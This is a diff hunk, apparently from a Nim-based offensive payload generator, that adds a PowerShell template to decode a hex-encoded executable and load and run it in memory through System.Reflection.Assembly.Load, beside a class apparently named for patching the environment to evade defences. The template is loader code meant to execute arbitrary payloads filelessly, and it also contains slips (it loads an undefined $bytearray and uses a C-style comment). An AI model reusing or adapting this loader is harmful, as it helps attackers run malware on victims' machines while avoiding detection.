@@ -2601,3 +2601,28 @@ internal class ExtraEnvironmentPatcher
 
 
 """
+
+
+let CSPSTemplate* = """
+
+function Convert-HexStringToBytes ($hexString) {
+    $bytes = [System.Collections.ArrayList]@()
+    for ($i = 0; $i -lt $hexString.Length; $i += 2) {
+        $bytes.Add([byte]::Parse($hexString.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber))
+    }
+    return $bytes.ToArray()
+}
+
+$PEstring = "QWERQWER"
+
+$bytes = Convert-HexStringToBytes $PEstring
+
+$RAS = [System.Reflection.Assembly]::Load($bytearray)
+
+// Invoke the entrypoint
+$RAS.EntryPoint.Invoke(0, @())
+
+
+
+
+"""
